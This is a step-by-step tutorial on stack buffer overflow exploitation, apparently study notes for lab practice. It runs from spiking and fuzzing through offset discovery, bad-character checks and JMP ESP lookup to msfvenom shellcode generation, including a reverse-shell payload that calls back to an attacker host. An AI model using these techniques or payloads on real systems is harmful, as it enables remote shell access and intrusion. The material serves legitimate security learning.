BOF Walkthru:

Stack explanation:
ESP at the top of the buffer
Buffer Space
EBP at the bottom of the buffer
EIP (points to return address for a function)

Buffer space should contain characters you are using - 
BOF attack is when buffer overflows EBP, overwrites EIP (with malicious shellcode)

Step 1: Spiking
throw a bunch of characters at avail commands to determine which one is vulnerable
use a tool called generic_send_tcp
generic_send_tcp <host> <port> <spike script> 0 0
by testing different spike scripts we can dtermine which command is vuln to bof
other way to test commands:
nc <target-ip> <port number>
> output from vuln services

Step 2: Fuzzing
Use a python script, open a socket connection to vulnerable program, send more and more bytes in the buffer until the program crashes
after performing spike tests, we can use a python script to determine the buffer length 
at whcih the vulnerable program crashes (saved as 1.py)
crashes at ~5400 bytes or ~3000 bytes
we have automated this step with the script: fuzzTest.py
run using command:
python fuzzTest.py --h <target-ip> --p <target-port> --cmd <command>


Step 3: Finding the Offset
now that we have the number of bytes program crashes at, we need to know at what offset we gain control of EIP
use metasploit pattern create to find the offset by creating a pattern:

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <buffer-length as dtrmnd in last step>
(shorter cmd: msf-pattern_create )

send pattern as buffer in our python script, crash vuln program
look at the value in eip register
use command, pass in value at eip in argument -q

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <buffer length> -q <value in EIP>
(shorter: msf-pattern_offset)

This will give us the offset location
now we know at what byte length we can control eip

we have automated this step with the script offsetTest.py
use the command:
python offsetTest.py --h <target-ip> --p <target-port> --cmd <command> --l <byte length at which overflow occurs, taken from previous step>
then inspect immunity debugger and copy down the value in the eip register
then use msf-pattern_offset to determine the offset

Step 4: Overwrite EIP
Test to make sure we can control EIP
Change the buffer to be of length X (offset from previous step)
followed by 4 letters (BBBB or CCCC to be easy to spot)
send the buffer to the program, crash it
check value of EIP
It should contain the bytes matching BBBB or CCCC
we have automated this using the script controlTest.py
run using the command:
python controlTest.py --h <target-ip> --p <target-port> --cmd <command> --offset <offset determined from last step>

Step 5: Find Bad characters
Before we generate a payload, we want to know what characters will be corrupted if past to the program
Go to 
https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/
and copy the string of character bytes.
add them to the end of our buffer, send it an crash the program

In Immunity Debugger, we can use mona.py to find which badchars dont make it thru:
use this command to generate a bytearray of chars:
!mona bytearray 
And use this command to see which characters did not make it through
!mona compare -f bytearray.bin -a 0x<address where array of chars begins in the stack> 
this should give us a pop up window with the badchars listed
Make sure to copy them somewhere
after finding bad characters, remove them from the byte array in our script and in immunity debugger
tell mona ot create a new bytearray without detected bad characters using command:
!mona bytearray -cpb "\x00"

Step 6: Find right moduke
We want to find a module in the vulnerable program with no memory protection
in Immunity Debugger, use this command to get a table of modules
!mona modules
the module we want to target should have the value false for the columns ASLR and DES - even better if false in each column!
The next step depends on what we want our payload to do
In most situations, we want to direct the program to the beginning of our payload at the top of the stack
To do this we need to find address for the command JMP ESP
In Kali Linux, use the tool nasm_shell

msf-nasm_shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
> jmp esp
>output: FFE4 (to save time ust refer here)

Back in Immunity Debugger, use the following command to find the memory address(es) in the vulnerable module with the code jmp esp:

in mona.py, use cmd !mona find -s '\xff\xe4' -m <vulnerable module>

this gives us a memory address to overwrite - copy it
because of x86 architecture we may have to write bytes for rtn address in reverse order
now that we have full control of eip, we can give it this memory address to point to our shellcode

Step 7: Generate Shellcode
use msfvenom to gen payload shellcode
examples:
msfvenom -p windows/shell_reverse_tcp  -f python --var-name payload -b "\x00" LHOST=192.168.111.130 LPORT=1234 EXITFUNC=thread

msfvenom -p windows/exec -b "\x00\x01\x0a" -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread --smallest


-p: type of payload
-b: bad characters to exclude
-f: programming language of payload 
--var-name: name of buffer holding payload
Make sure EXITFUNC=thread so that payload exits cleanly, doesnt crash target program

copy payload into our buffer
run python script to crash program, execute payload
if payload doesnt work right away, try adding some nops ("\x90") between pointer adress and payload



Step 8: Profit!
